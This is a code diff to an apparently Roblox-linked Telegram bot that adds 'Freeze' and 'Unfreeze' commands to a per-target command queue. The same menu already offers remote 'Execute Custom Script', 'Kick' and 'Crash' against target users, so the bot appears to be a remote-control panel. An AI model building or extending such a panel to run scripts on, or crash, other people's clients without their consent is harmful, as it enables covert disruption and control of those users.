@@ -320,6 +320,7 @@ game:GetService("Debris"):AddItem(gui, {duration})
                         "inline_keyboard": [
                             [{"text": "💬 Message", "callback_data": f"message_{target_user}"}],
                             [{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}],
+                            [{"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"}, {"text": "🏃 Unfreeze", "callback_data": f"unfreeze_{target_user}"}],
                             [{"text": "🥾 Kick", "callback_data": f"kick_{target_user}"}, {"text": "💥 Crash", "callback_data": f"crash_{target_user}"}],
                             [{"text": "💀 Reset", "callback_data": f"reset_{target_user}"}],
                             [{"text": "✅ Check Status", "callback_data": f"checkstatus_{target_user}"}],
@@ -400,6 +401,20 @@ game:GetService("Debris"):AddItem(gui, {duration})
                         f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                         json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💀 Команда сброса (Reset) отправлена {target_user}"}
                     )
+                
+                # --- ЗАМОРОЗКА ---
+                elif btn_action == "freeze":
+                    action = "/freeze"
+                    if target_user not in commands_queue: commands_queue[target_user] = []
+                    commands_queue[target_user].append(action)
+                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🧊 Команда Freeze (Заморозка) отправлена {target_user}"})
+                
+                # --- РАЗМОРОЗКА ---
+                elif btn_action == "unfreeze":
+                    action = "/unfreeze"
+                    if target_user not in commands_queue: commands_queue[target_user] = []
+                    commands_queue[target_user].append(action)
+                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🏃 Команда Unfreeze (Разморозка) отправлена {target_user}"})
                 
             # Убираем часики загрузки с нажатой кнопки
             requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback_id})
